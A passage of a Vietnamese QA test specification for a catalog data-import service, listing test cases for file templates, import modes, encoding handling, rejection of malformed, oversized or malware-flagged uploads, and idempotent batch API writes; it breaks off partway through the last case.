**Tiền điều kiện chung.** CAT-LH v1 PUBLISHED 39 bản ghi; bản nháp v2 vừa tạo, chưa sửa (trừ khi ca ghi khác); thêm vào bản nháp 2 bản ghi mới `KH03.L09.P04`, `KH03.L09.P05` (chưa từng phát hành) để kiểm thử REPLACE. Người gọi U-T68-DS-NV. Hàng đợi tác vụ nền hoạt động.

#### TC-07-093 · Tải tệp mẫu Excel sinh theo lược đồ
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API (đọc tệp bằng Apache POI), E2E
- **Truy vết** FR-07-020 · API-07-032 · UI-07-06 · FR-00-033 · khung §3.14
- **Tiền điều kiện / dữ liệu** Như chung.
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC/import-template?format=xlsx`.
  2. Mở tệp: kiểm tra sheet, dòng 1, dòng 2, thứ tự cột, ràng buộc ô.
- **Mong đợi** `200`, `Content-Type` xlsx, `Content-Disposition` có tên tệp `LOAI_HINH_TC_mau.xlsx`. Có đúng ba sheet `HuongDan`, `DuLieu`, `GiaTriHopLe`. Sheet `DuLieu` dòng 1 là nhãn tiếng Việt, dòng 2 là mã cột (ẩn, khóa), thứ tự `MA`, `TEN`, `MA_CHA`, `THU_TU`, `TRANG_THAI`, `MA_THAY_THE`, `HIEU_LUC_TU`, `HIEU_LUC_DEN`, rồi `viet_tat`, `cap_quan_ly`, `ngay_thanh_lap`, `so_bien_che`, `website` theo `sortOrder`. Cột `cap_quan_ly` có kiểm tra dữ liệu dạng danh sách lấy từ `GiaTriHopLe`. Thuộc tính HIDDEN không xuất hiện. Sheet `HuongDan` mô tả kiểu, bắt buộc, ràng buộc của từng cột.

#### TC-07-094 · Tệp mẫu CSV và yêu cầu tệp mẫu không hợp lệ
- **Loại** Dương, Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-020 · API-07-032 · ERR-07-001
- **Tiền điều kiện / dữ liệu** Như chung.
- **Bước**
  1. Gọi `GET /catalogs/LOAI_HINH_TC/import-template?format=csv`.
  2. Gọi `GET /catalogs/KHONG_CO/import-template?format=xlsx`.
  3. Gọi `GET /catalogs/LOAI_HINH_TC/import-template?format=pdf`.
- **Mong đợi** Bước 1 trả CSV bắt đầu bằng BOM `EF BB BF`, dòng tiêu đề là mã cột phân cách `,`, kết thúc dòng CRLF theo RFC 4180. Bước 2 trả `404` `ERR-07-001`. Bước 3 trả `400`.

#### TC-07-095 · Nhập UPSERT tệp hợp lệ, đi qua đủ trạng thái tác vụ
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, IT, E2E
- **Truy vết** FR-07-021 · UC-07-03 · API-07-033, 034, 036 · UI-07-06 · EVT-07-07 · LGC-DMDC-006
- **Tiền điều kiện / dữ liệu** F-OK10.
- **Bước**
  1. Gọi `POST /import-jobs` multipart: `file` = F-OK10, `catalogCode` = `LOAI_HINH_TC`, `version` = `draft`, `mode` = `UPSERT`, `Idempotency-Key: imp-095`.
  2. Thăm dò `GET /import-jobs/{jobId}` mỗi giây, ghi lại chuỗi trạng thái.
  3. Khi `VALIDATED`, gọi `GET /import-jobs/{jobId}/rows?page=0&size=50`.
  4. Gọi `POST /import-jobs/{jobId}:commit` thân `{"skipInvalidRows":false}`.
  5. Gọi `GET /catalogs/LOAI_HINH_TC/versions/draft/items?size=100`.
- **Mong đợi** Bước 1 trả `202` kèm `Location`. Chuỗi trạng thái quan sát được là `UPLOADED` → `SCANNING` → `PARSING` → `VALIDATING` → `VALIDATED` (có thể bỏ lỡ trạng thái trung gian ngắn, nhưng không có trạng thái ngoài chuỗi). Tóm tắt: `totalRows` 10, `validRows` 10, `errorRows` 0, `encoding` = `UTF-8`, `template` = `STANDARD`. Bước 4 trả `202`/`200`, trạng thái đi qua `COMMITTING` tới `COMMITTED`. Bản nháp có 46 bản ghi (39 + 7 mới), 3 bản ghi đổi tên. `catalog_version.origin` giữ `MANUAL` hoặc ghi nhận nguồn `IMPORT` theo SDD. EVT-07-07 phát hai lần (một với `status = VALIDATED`, một với `COMMITTED`). KT: có (IMPORT_COMMIT, số dòng). Trên UI-07-06, bốn bước của trình hướng dẫn hoàn tất và có thông báo khi tác vụ nền xong (FR-00-054, 060).

#### TC-07-096 · Bảng kết quả theo dòng của chế độ UPSERT
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-021 · EN-07-09 · API-07-035
- **Tiền điều kiện / dữ liệu** Tệp `upsert_mix.xlsx` 6 dòng sinh có chủ đích như bảng dưới.
- **Bước**
  1. Tạo tác vụ `UPSERT`, chờ `VALIDATED`, đọc `GET /import-jobs/{jobId}/rows`.
  2. Commit, đọc bản nháp.
- **Mong đợi** Hành động xem trước và trạng thái sau commit khớp bảng sau.

| Dòng | Nội dung | `action` xem trước | Sau commit |
|---|---|---|---|
| 3 | Mã mới `KH01.L01.P20` | `INSERT` | Bản ghi mới ACTIVE |
| 4 | Mã `KH01` có tên khác | `UPDATE` | Tên mới |
| 5 | Mã `KH01.L02` giống hệt bản nháp | `UNCHANGED` | Không đổi, `updated_at` không đổi |
| 6 | Mã `KH02.L01.P01` có `TRANG_THAI` = `DEPRECATED`, `MA_THAY_THE` = `KH02.L01.P02` | `DEPRECATE` | DEPRECATED, `replacedBy` đúng |
| 7 | Mã `kh01.l03` (chữ thường) có `viet_tat` mới | `UPDATE` | Khớp với `KH01.L03` (BR-07-002) |
| 8 | Ô `viet_tat` trống với bản ghi đang có giá trị | `UPDATE` | Giá trị bị xóa (ô trống nghĩa là rỗng, theo quy ước ghi trong sheet `HuongDan`) |

> **Câu hỏi mở Q07-82:** Ô trống trong tệp nhập UPSERT nghĩa là "xóa giá trị" hay "giữ nguyên"? TC-07-096 dòng 8 giả định "xóa giá trị", phù hợp với nguyên tắc tệp là ảnh chụp đầy đủ của bản ghi; cần FRS chốt và ghi vào sheet `HuongDan`.

#### TC-07-097 · Chế độ REPLACE: bảng kết quả mong đợi
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-021 · BR-07-003 · khung §3.13
- **Tiền điều kiện / dữ liệu** Bản nháp có 41 bản ghi (39 đã phát hành + 2 mới). F-REPL 30 bản ghi: thiếu 9 bản ghi đã phát hành và cả 2 bản ghi mới.
- **Bước**
  1. Tạo tác vụ `mode = REPLACE`, chờ `VALIDATED`, đọc tóm tắt và các dòng.
  2. Commit.
  3. Đọc bản nháp và diff với v1.
- **Mong đợi** Tóm tắt xem trước có `toDeprecate` = 9, `toDelete` = 2 và cảnh báo "có thay đổi phá vỡ". Sau commit: bản nháp có 39 bản ghi từng phát hành (9 trong số đó DEPRECATED) + 0 bản ghi mới; 2 bản ghi mới bị xóa vật lý. Diff có 9 mục ngừng dùng, `breaking` > 0. Nếu một bản ghi thiếu trong tệp là cha của bản ghi có trong tệp và vẫn ACTIVE thì tác vụ có lỗi ở mức tệp (ERR-07-010) và không commit được (kiểm tra bằng biến thể tệp `lh_replace_parent.xlsx`).

#### TC-07-098 · REPLACE gây thay đổi phá vỡ buộc phải duyệt
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-021 · BR-07-012 · ERR-07-016
- **Tiền điều kiện / dữ liệu** CAT-MUC (`require_approval = false`), nhập REPLACE thiếu 1 bản ghi đã phát hành.
- **Bước**
  1. Commit tác vụ, sau đó U-T68-DA1 gọi `:publish` trên bản nháp.
- **Mong đợi** `:publish` trả `409` `ERR-07-016`; phải qua trình duyệt.

#### TC-07-099 · Chế độ APPEND: trùng mã là lỗi dòng
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-021 · BR-07-002 · ERR-07-008
- **Tiền điều kiện / dữ liệu** Tệp `append.csv` 5 dòng: 3 mã mới, 1 mã đã có `KH01`, 1 mã `KH01.L01.P20` lặp hai lần trong tệp.
- **Bước**
  1. Tạo tác vụ `mode = APPEND`, chờ `VALIDATED`.
- **Mong đợi** `validRows` = 3 (chỉ 3 mã mới; mã lặp trong tệp bị đánh lỗi ở lần xuất hiện thứ hai), `errorRows` = 2; lỗi có `code` = `ERR-07-008`, `column` = `MA`.

#### TC-07-100 · Xem trước báo lỗi theo dòng và cột
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-013, 021 · API-07-035 · UI-07-06 · FR-00-032
- **Tiền điều kiện / dữ liệu** F-ERR (12 dòng dữ liệu từ dòng 3 tới 14 của sheet `DuLieu`).
- **Bước**
  1. Tạo tác vụ UPSERT, chờ `VALIDATED`.
  2. Gọi `GET /import-jobs/{jobId}/rows?valid=false`.
  3. Trên UI-07-06 bước "Xem trước và lỗi", lọc "Chỉ dòng lỗi".
- **Mong đợi** Trạng thái `VALIDATED` (có lỗi vẫn là xem trước thành công), `errorRows` = 9. Danh sách lỗi khớp bảng sau (số dòng là số dòng trong Excel). Giao diện hiển thị cùng thông tin, ô lỗi được tô và có chú thích.

| Dòng | Cột | Mã lỗi |
|---|---|---|
| 3 | `ngay_thanh_lap` | ERR-07-009 |
| 4 | `cap_quan_ly` | ERR-07-009 |
| 5, 6 | `MA` | ERR-07-008 (cả hai dòng hoặc dòng thứ hai, theo quy ước "lần xuất hiện sau là lỗi": chỉ dòng 6) |
| 7 | `MA_CHA` | ERR-07-010 |
| 8, 9 | `MA_CHA` | ERR-07-010 (vòng) |
| 10 | `MA_CHA` | ERR-07-011 |
| 11 | `TEN` | ERR-07-009 (bắt buộc) |

#### TC-07-101 · Commit tệp có dòng lỗi mà không chọn bỏ qua
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-021 · BR-07-015 · ERR-07-021 · FR-00-032
- **Tiền điều kiện / dữ liệu** Tác vụ F-ERR ở `VALIDATED`.
- **Bước**
  1. Gọi `:commit` với `{"skipInvalidRows":false}`.
  2. Đếm bản ghi bản nháp.
- **Mong đợi** `422` `ERR-07-021`; tác vụ giữ `VALIDATED` (có thể commit lại với tùy chọn bỏ qua); bản nháp không đổi một dòng nào.

#### TC-07-102 · Commit có bỏ qua dòng lỗi
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-021 · BR-07-015
- **Tiền điều kiện / dữ liệu** Tác vụ F-ERR ở `VALIDATED`.
- **Bước**
  1. Gọi `:commit` với `{"skipInvalidRows":true}`.
- **Mong đợi** `COMMITTED`; chỉ các dòng hợp lệ được ghi; tóm tắt có `committedRows`, `skippedRows`; bản ghi kiểm toán ghi rõ số dòng bỏ qua.

#### TC-07-103 · Tải báo cáo lỗi và xem lịch sử tác vụ
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-025 · API-07-035, 040 · UI-07-08
- **Tiền điều kiện / dữ liệu** Tác vụ F-ERR đã chạy.
- **Bước**
  1. Gọi `GET /import-jobs/{jobId}/rows?valid=false&format=xlsx`.
  2. Gọi `GET /jobs?type=IMPORT&catalogCode=LOAI_HINH_TC`.
  3. Mở UI-07-08, lọc theo danh mục.
- **Mong đợi** Bước 1 trả xlsx gồm dữ liệu gốc của dòng lỗi và cột "Lỗi" mô tả tiếng Việt, người dùng sửa và nhập lại được. Bước 2 trả danh sách có `status`, `mode`, `fileName`, số dòng, người tạo, thời gian. Không lộ `file_id` nội bộ hoặc đường dẫn kho đối tượng.

#### TC-07-104 · Kết quả xem trước hết hạn sau 24 giờ
- **Loại** Âm, Biên · **Ưu tiên** P1 · **Tự động** IT (đồng hồ giả lập)
- **Truy vết** FR-07-021 · BR-07-016 · ERR-07-020
- **Tiền điều kiện / dữ liệu** Tác vụ F-OK10 ở `VALIDATED` lúc T0.
- **Bước**
  1. Đặt đồng hồ T0 + 23 giờ 59 phút; gọi `GET /import-jobs/{jobId}`.
  2. Đặt đồng hồ T0 + 24 giờ 1 phút; chạy bộ dọn tác vụ hết hạn; gọi `GET`.
  3. Gọi `:commit`.
- **Mong đợi** Bước 1 vẫn `VALIDATED`. Bước 2 trạng thái `EXPIRED`. Bước 3 trả `409` `ERR-07-020` (chi tiết "đã hết hạn"). Dòng `import_row` bị dọn theo lịch 7 ngày.

#### TC-07-105 · Bản nháp bị sửa sau khi phân tích
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-021 · BR-07-016 · ERR-07-020
- **Tiền điều kiện / dữ liệu** Tác vụ F-OK10 ở `VALIDATED` (ghi nhận `version` của bản nháp lúc phân tích).
- **Bước**
  1. Người khác sửa một bản ghi trong bản nháp qua `PATCH`.
  2. Gọi `:commit`.
- **Mong đợi** `409` `ERR-07-020` (chi tiết "bản nháp đã thay đổi, vui lòng phân tích lại"). Không ghi gì. Tác vụ chuyển `FAILED` hoặc giữ `VALIDATED` có cờ `stale` theo SDD; ca này chỉ yêu cầu không commit được.

#### TC-07-106 · Commit lại tác vụ đã ghi
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-021 · ERR-07-020
- **Tiền điều kiện / dữ liệu** Tác vụ TC-07-095 `COMMITTED`.
- **Bước**
  1. Gọi lại `:commit` không có `Idempotency-Key`.
  2. Gọi lại `:commit` với đúng `Idempotency-Key` của lần commit trước.
- **Mong đợi** Bước 1 trả `409` `ERR-07-020`. Bước 2 trả lại phản hồi lần đầu (phát lại idempotent), không ghi thêm.

#### TC-07-107 · Hủy tác vụ nhập đang chờ xác nhận
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API, E2E
- **Truy vết** FR-07-021 · API-07-037
- **Tiền điều kiện / dữ liệu** Tác vụ ở `VALIDATED`.
- **Bước**
  1. Gọi `POST /import-jobs/{jobId}:cancel`.
- **Mong đợi** `200`, trạng thái `CANCELLED`; tệp tải lên được đánh dấu hết hạn trong `file_object`; bản nháp không đổi.

#### TC-07-108 · Commit tác vụ đã hủy
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-021 · ERR-07-020
- **Tiền điều kiện / dữ liệu** Tác vụ `CANCELLED`.
- **Bước**
  1. Gọi `:commit`.
  2. Gọi `:cancel` lần nữa.
- **Mong đợi** Bước 1 trả `409` `ERR-07-020`. Bước 2 trả `409` `ERR-07-020` hoặc `200` không đổi trạng thái (idempotent) theo D03-04; không lỗi `500`.

#### TC-07-109 · Ghép cột khi tiêu đề tệp khác khuôn mẫu
- **Loại** Dương · **Ưu tiên** P2 · **Tự động** API, E2E
- **Truy vết** FR-07-021 · UI-07-06 · EN-07-08 (`column_mapping`)
- **Tiền điều kiện / dữ liệu** Tệp `custom_header.xlsx` có tiêu đề "Mã", "Tên loại hình", "Mã cấp trên", "Viết tắt", thêm cột "Cột thừa".
- **Bước**
  1. Tạo tác vụ; hệ thống đề xuất ghép cột tự động.
  2. Trên UI-07-06 bước "Ghép cột", xác nhận đề xuất, đặt "Cột thừa" là "Bỏ qua"; gửi `columnMapping`.
  3. Chờ `VALIDATED`.
- **Mong đợi** Đề xuất ghép tự động đúng 4 cột theo nhãn (không dấu, không phân biệt hoa thường). Cột bỏ qua không gây lỗi. Ghép thiếu cột bắt buộc `TEN` thì nút "Tiếp tục" bị vô hiệu và API trả `422` `ERR-07-019`.

#### TC-07-110 · Lỗi giữa chừng khi commit được hoàn tác toàn bộ
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** IT (tiêm lỗi)
- **Truy vết** FR-07-021 · BR-07-015
- **Tiền điều kiện / dữ liệu** F-100K vào `DM_LON_100K`, tác vụ `VALIDATED`; cấu hình tiêm lỗi ném ngoại lệ ở dòng 70.000 của bước ghi.
- **Bước**
  1. Gọi `:commit`.
  2. Đếm bản ghi bản nháp; kiểm tra outbox.
- **Mong đợi** Tác vụ `FAILED` với `errorMessage` không lộ chi tiết kỹ thuật; bản nháp đúng như trước commit (0 dòng được ghi); EVT-07-07 phát với `status = FAILED`; không có sự kiện nào khác.

### TS-07-09 · Nhập tệp: định dạng, mã hóa, khuôn Aita, tạo danh mục từ tệp và tệp bất thường

**Mục tiêu.** Xác nhận bộ phân tích tệp nhận đúng các định dạng và mã hóa đã cam kết (xlsx, CSV UTF-8 có và không BOM, UTF-16 LE/BE), hỗ trợ khuôn hệ cũ Aita (ô A2 là tên danh mục, dòng 4 từ ô B4 là tên thuộc tính, từ dòng 5 là bản ghi, theo HDSD Aita mục 4.3), tạo danh mục mới từ tệp, và từ chối an toàn các tệp bất thường (giả mạo đuôi, nhiễm mã độc, bom nén, vượt giới hạn, thiếu cột). Kịch bản thay thế LGC-DMDC-005.

**Phủ.** FR-07-021, 022; UC-07-04; API-07-033, 034, 036; UI-07-06; ERR-07-002, 009, 019; EN-07-19 `file_object` (`scan_status`).

**Tiền điều kiện chung.** Người gọi U-T68-DS-NV; dịch vụ quét mã độc (ClamAV qua cơ chế DD-12) hoạt động ở SIT, được giả lập ở CI.

#### TC-07-111 · Nhập CSV UTF-8 có BOM
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-021 · LGC-DMDC-007
- **Tiền điều kiện / dữ liệu** F-OK10-CSV; bản nháp CAT-LH.
- **Bước**
  1. Tạo tác vụ UPSERT, chờ `VALIDATED`, commit.
- **Mong đợi** `encoding` = `UTF-8`; kết quả giống TC-07-095 (cùng dữ liệu, khác định dạng); tên có dấu tiếng Việt đúng từng ký tự.

#### TC-07-112 · Nhập CSV UTF-8 không BOM có ký tự tổ hợp
- **Loại** Dương, Biên · **Ưu tiên** P1 · **Tự động** API, UT
- **Truy vết** FR-07-021 · khung §3.13
- **Tiền điều kiện / dữ liệu** F-NOBOM.
- **Bước**
  1. Tạo tác vụ, chờ `VALIDATED`, commit.
  2. Tìm `GET /catalogs/LOAI_HINH_TC/versions/draft/items?q=dong hoa`.
- **Mong đợi** `encoding` = `UTF-8` (tự nhận dạng không cần BOM). Tên được chuẩn hóa về NFC khi lưu ("Phường Đông Hòa" dạng NFD lưu thành NFC); tìm không dấu ra kết quả.

#### TC-07-113 · Tạo danh mục từ tệp xlsx khuôn Aita
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, E2E
- **Truy vết** FR-07-022 · UC-07-04 · API-07-033, 036 · UI-07-06 · LGC-DMDC-005
- **Tiền điều kiện / dữ liệu** F-AITA-X (25 bản ghi; cột B là "Mã nghề").
- **Bước**
  1. Gọi `POST /import-jobs` với `mode = CREATE_CATALOG`, `template = LEGACY_AITA`, `newCatalogCode` = `TC113_NGHE`, `codeColumn` = "Mã nghề", `nameColumn` = "Tên nghề".
  2. Chờ `VALIDATED`; xem lược đồ đề xuất trong tóm tắt.
  3. Commit.
  4. Gọi `GET /catalogs/TC113_NGHE` và `.../versions/draft/attributes`, `.../items`.
- **Mong đợi** Tên danh mục đề xuất lấy từ ô A2 "Danh mục nghề nghiệp (giả lập)". Thuộc tính lấy từ dòng 4 bắt đầu ô B4; cột A (số thứ tự) bị bỏ qua. Thuộc tính không phải mã, tên ("Ghi chú") được tạo kiểu `STRING` với mã sinh tự động dạng không dấu `ghi_chu`, `legacyFieldId` rỗng. Có 25 bản ghi từ dòng 5. Danh mục ở `DRAFT`, v1 `DRAFT` `origin = IMPORT`. EVT-07-01 và EVT-07-07 phát. Giao diện chuyển tới UI-07-02 của danh mục mới (tương đương hành vi Aita chuyển sang màn chỉnh sửa).

#### TC-07-114 · Khuôn Aita CSV mã hóa UTF-16 LE và BE
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API, UT
- **Truy vết** FR-07-022 · LGC-DMDC-005
- **Tiền điều kiện / dữ liệu** F-AITA-U16, F-AITA-U16BE (phân cách tab).
- **Bước**
  1. Tạo tác vụ CREATE_CATALOG LEGACY_AITA cho từng tệp (mã `TC114_LE`, `TC114_BE`).
  2. Commit và so sánh nội dung hai danh mục với TC-07-113.
- **Mong đợi** `encoding` lần lượt `UTF-16LE`, `UTF-16BE`; phân cách tab được tự nhận dạng; nội dung ba danh mục giống nhau từng ký tự.

#### TC-07-115 · Tệp hỏng không phân tích được
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-021 · ERR-07-019
- **Tiền điều kiện / dữ liệu** `truncated.xlsx` (xlsx cắt mất 30% cuối).
- **Bước**
  1. Tạo tác vụ, thăm dò trạng thái.
- **Mong đợi** Trạng thái đi `SCANNING` → `PARSING` → `FAILED`; `errorMessage` tiếng Việt "Tệp không đọc được…", mã `ERR-07-019`. EVT-07-07 `status = FAILED`. Không có dòng `import_row` nào còn lại.

#### TC-07-116 · Tệp giả mạo đuôi
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-021 · ERR-07-019 · DD-12 (`content_type` theo nội dung)
- **Tiền điều kiện / dữ liệu** F-FAKE.
- **Bước**
  1. Gửi `POST /import-jobs` với `file` = F-FAKE, khai báo `Content-Type` = xlsx.
- **Mong đợi** Bị từ chối ngay khi tải lên với `422` `ERR-07-019` (chi tiết "nội dung tệp không khớp định dạng") hoặc tác vụ `FAILED` trước bước phân tích; tệp không được chuyển cho bộ phân tích; `file_object.content_type` ghi kiểu thực tế phát hiện.

#### TC-07-117 · Vượt giới hạn số dòng và kích thước
- **Loại** Âm, Biên · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-021 · ERR-07-019 · khung §3.14
- **Tiền điều kiện / dữ liệu** F-200K1, F-51MB, biến thể đúng 200.000 dòng `big_200000.csv`, đúng 50 MB `big_50mb.csv`.
- **Bước**
  1. Gửi lần lượt bốn tệp.
- **Mong đợi** Tệp 51 MB bị APISIX hoặc ứng dụng từ chối với `413`/`422` `ERR-07-019` trước khi đọc hết thân yêu cầu. Tệp 200.001 dòng: tác vụ `FAILED` với `ERR-07-019` ngay khi bộ đọc luồng gặp dòng 200.001 (không đọc hết tệp mới báo). Hai tệp biên được chấp nhận và tới `VALIDATED`.

#### TC-07-118 · Thiếu cột bắt buộc
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-021 · ERR-07-019
- **Tiền điều kiện / dữ liệu** F-MISSCOL.
- **Bước**
  1. Tạo tác vụ UPSERT không gửi `columnMapping`.
- **Mong đợi** Tác vụ `FAILED` hoặc `422` `ERR-07-019` với chi tiết "thiếu cột TEN".

#### TC-07-119 · Tệp nhiễm mã độc bị chặn ở bước quét
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API (SIT)
- **Truy vết** FR-07-021 · DD-12 (`scan_status`) · BR-07-041 · ERR-07-038
- **Tiền điều kiện / dữ liệu** F-EICAR.
- **Bước**
  1. Tạo tác vụ, thăm dò trạng thái.
- **Mong đợi** Trạng thái `SCANNING` → `FAILED` với `ERR-07-038`; `file_object.scan_status = INFECTED`; tệp bị cách ly hoặc xóa khỏi kho đối tượng; không có dòng `import_row`; có sự kiện an ninh gửi PH-13 kèm tên tệp và người tải.

#### TC-07-120 · Bom nén xlsx
- **Loại** Âm, Bảo mật · **Ưu tiên** P1 · **Tự động** API, IT
- **Truy vết** FR-07-021 · ERR-07-019 · NFR-07-012
- **Tiền điều kiện / dữ liệu** F-ZIPBOMB.
- **Bước**
  1. Tạo tác vụ; theo dõi bộ nhớ pod `dh-data`.
- **Mong đợi** Tác vụ `FAILED` với `ERR-07-019` (vượt tỉ lệ nén hoặc kích thước giải nén tối đa, ví dụ `ZipSecureFile.setMinInflateRatio` của POI); bộ nhớ heap không vượt 2 GB, pod không khởi động lại; các yêu cầu tra cứu song song không bị ảnh hưởng (p95 không vượt 2 lần nền).

#### TC-07-121 · Tạo danh mục từ tệp khuôn chuẩn có sheet khai báo thuộc tính
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-022 · khung §3.13
- **Tiền điều kiện / dữ liệu** F-NEWCAT.
- **Bước**
  1. Tạo tác vụ `mode = CREATE_CATALOG`, `template = STANDARD`, `newCatalogCode` = `TC121_DM`; commit.
- **Mong đợi** Danh mục mới có thuộc tính đúng kiểu và ràng buộc theo sheet `ThuocTinh`; bản ghi đúng; kiểm tra hợp lệ theo lược đồ mới được áp dụng ngay ở pha 1.

#### TC-07-122 · Khuôn Aita có tên thuộc tính trống hoặc tên danh mục trùng
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-022 · ERR-07-019, ERR-07-002
- **Tiền điều kiện / dữ liệu** F-AITA-B4; F-AITA-X với `newCatalogCode` = `LOAI_HINH_TC` (đã tồn tại).
- **Bước**
  1. Tạo tác vụ CREATE_CATALOG LEGACY_AITA với F-AITA-B4.
  2. Tạo tác vụ với F-AITA-X và mã trùng.
- **Mong đợi** Bước 1: `FAILED` `ERR-07-019` "Ô C4 tên thuộc tính không được để trống" (giữ đúng ràng buộc của Aita). Bước 2: `409` `ERR-07-002` ngay khi tạo tác vụ hoặc khi commit.

#### TC-07-123 · Giá trị quá dài
- **Loại** Biên, Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-013, 021 · ERR-07-009
- **Tiền điều kiện / dữ liệu** F-LONG: `TEN` 255 ký tự (biên), `TEN` 256 ký tự, `TEN` 2.000 ký tự, `viet_tat` 21 ký tự.
- **Bước**
  1. Tạo tác vụ, chờ `VALIDATED`.
- **Mong đợi** Dòng `TEN` 255 ký tự hợp lệ; các dòng còn lại lỗi `ERR-07-009` đúng cột. Giới hạn độ dài `name` theo kiểu T-NAME của D00-01 (giả định 255; đối chiếu D00-01 §5).

#### TC-07-124 · Ô chứa công thức được lưu nguyên văn, không thực thi
- **Loại** Bảo mật · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-021, 024 · OWASP ASVS V5 (đầu ra)
- **Tiền điều kiện / dữ liệu** F-FORMULA.
- **Bước**
  1. Tạo tác vụ UPSERT, xem trước.
  2. Commit, đọc bản ghi qua API.
- **Mong đợi** Xem trước gắn cảnh báo "giá trị bắt đầu bằng ký tự công thức" (không phải lỗi). Giá trị lưu đúng nguyên văn trong CSDL (không tính toán, không gọi mạng). Phần xuất ra tệp được kiểm thử ở TC-07-308.

### TS-07-10 · Nhập bản ghi qua API theo lô, idempotency

**Mục tiêu.** Xác nhận HTTT có scope `rdm.write` ghi được lô thao tác (thêm, sửa, ngừng dùng) vào bản nháp qua API-07-031 với giới hạn 5.000 thao tác, theo kiểu tất cả hoặc không, idempotent theo `Idempotency-Key`. Thay thế LGC-DMDC-008 (Aita có ba API riêng thêm tên danh mục, thêm thuộc tính, thêm bản ghi).

**Phủ.** FR-07-023; UC-07-05; API-07-031; ERR-07-003, 004, 022, 026; tham số `07.rdm.batch-max-ops`.

**Tiền điều kiện chung.** CAT-LH có bản nháp; người gọi APP-T68-WRITE (scope `rdm.write`).

#### TC-07-125 · Lô thao tác hợp lệ
- **Loại** Dương · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-023 · API-07-031 · UC-07-05 · LGC-DMDC-008
- **Tiền điều kiện / dữ liệu** Lô 100 thao tác: 60 `upsert` mới, 30 `upsert` sửa, 10 `deprecate`.
- **Bước**
  1. Gọi `POST /catalogs/LOAI_HINH_TC/versions/draft/items:batch` với `Idempotency-Key: b-125`, thân `{"operations":[{"op":"upsert","item":{...}},{"op":"deprecate","code":"...","replacedBy":[...]}]}`.
- **Mong đợi** `200`, kết quả từng thao tác theo chỉ số (`index`, `code`, `result` ∈ `INSERTED`/`UPDATED`/`DEPRECATED`/`UNCHANGED`). Bản nháp phản ánh đủ 100 thao tác. KT: có một bản ghi kiểm toán cho lô (chủ thể là HTTT `HT-NOIVU`, số thao tác). EVT: không (chỉ phát khi phát hành).

#### TC-07-126 · Lô vượt kích thước tối đa
- **Loại** Âm, Biên · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-023 · ERR-07-026
- **Tiền điều kiện / dữ liệu** Lô 5.000 và 5.001 thao tác.
- **Bước**
  1. Gửi lô 5.000.
  2. Gửi lô 5.001.
- **Mong đợi** Bước 1 trả `200`. Bước 2 trả `400` `ERR-07-026` trước khi xử lý bất kỳ thao tác nào.

#### TC-07-127 · Phát lại cùng khóa idempotent và dùng lại khóa với nội dung khác
- **Loại** Dương, Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-023 · ERR-07-022
- **Tiền điều kiện / dữ liệu** Đã chạy TC-07-125 với `b-125`.
- **Bước**
  1. Gửi lại nguyên văn lô với `b-125`.
  2. Gửi lô khác nội dung với `b-125`.
  3. Gửi hai yêu cầu cùng khóa mới `b-127` đồng thời.
- **Mong đợi** Bước 1 trả phản hồi giống lần đầu, không ghi lại, không thêm kiểm toán. Bước 2 trả `409` `ERR-07-022`. Bước 3: một yêu cầu được xử lý, yêu cầu kia nhận cùng kết quả hoặc `409` "đang xử lý" theo D03-04; bản nháp chỉ chịu tác động một lần.

#### TC-07-128 · Lô có thao tác lỗi bị từ chối toàn bộ
- **Loại** Âm · **Ưu tiên** P1 · **Tự động** API
- **Truy vết** FR-07-023 · BR-07-015 · ERR-07-009
- **Tiền điều kiện / dữ liệu** Lô 50 thao tác, thao tác chỉ số 17 sai kiểu `ngay_thanh_lap`, chỉ số 42 có mã cha không tồn tại.
- **Bước**
  1. Gửi lô.
- **Mong đợi** `422` `ERR-07-009`, `errors` có `index` 17 và 42 kèm mã lỗi con (ERR-07-009, ERR-07-010). Không thao tác nào được ghi.

#### TC-07-129 · Lô ghi vào phiên bản không phải bản nháp hoặc danh mục chỉ đọc
- **Loại** Âm · **Ưu tiên** P2 · **Tự động** API
- **Truy vết** FR-07-023 · ERR-07-004, ERR-07-003
- **Tiền điều kiện / dữ liệu** CAT-LH v1 PUBLISHED; `GIOI_TINH` COMMON.
- **Bước**
  1. Gửi lô vào `/catalogs/LOAI_HINH_TC/versions/1/items:batch`.
